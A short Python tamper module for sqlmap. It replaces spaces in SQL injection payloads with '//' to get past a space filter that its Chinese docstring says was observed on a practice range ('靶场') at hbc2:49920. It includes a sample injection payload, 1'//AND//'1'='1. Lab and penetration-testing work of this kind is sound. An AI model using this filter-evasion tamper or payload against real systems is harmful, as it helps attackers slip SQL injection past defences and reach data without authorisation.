# -*- coding: utf-8 -*-
"""space2slash：把 SQL payload 里的空格替换为 `//`。

2026-10-18 hbc2:49920 实测：该靶场过滤空格、把 `//` 当空格执行，
已确认 payload 形态为 `1'//AND//'1'='1`。sqlmap 自带 tamper 没有这一种。
"""
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL


def dependencies():
    pass


def tamper(payload, **kwargs):
    if not payload:
        return payload
    return payload.replace(" ", "//")
